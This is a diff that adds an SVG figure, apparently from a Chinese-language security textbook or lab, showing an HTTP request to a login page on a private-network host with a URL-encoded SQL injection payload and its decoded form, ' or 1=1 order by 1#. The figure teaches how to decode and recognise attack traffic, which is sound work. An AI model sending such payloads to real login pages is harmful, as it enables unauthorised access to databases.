@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 860 280" font-family="ui-monospace, Menlo, Consolas, monospace">
+  <rect width="860" height="280" fill="#0f172a"/>
+  <text x="24" y="36" font-size="16" fill="#94a3b8">图1-2 攻击分组载荷（节选）</text>
+  <text x="24" y="72" font-size="14" fill="#67e8f9">GET /login.php?id=%31%27%20or%201%3D1%20order%20by%201%23 HTTP/1.1</text>
+  <text x="24" y="104" font-size="14" fill="#e2e8f0">Host: 192.168.70.140</text>
+  <text x="24" y="136" font-size="14" fill="#e2e8f0">User-Agent: Mozilla/5.0</text>
+  <text x="24" y="168" font-size="14" fill="#fbbf24">Payload hex/encoded:</text>
+  <text x="24" y="196" font-size="13" fill="#fca5a5">%27%20or%201%3D1%20order%20by%201%23  →  ' or 1=1 order by 1#</text>
+  <text x="24" y="236" font-size="13" fill="#94a3b8">提示：大量 %xx 字符需用 URL 编码（百分号编码）解码后查看明文。</text>
+</svg>
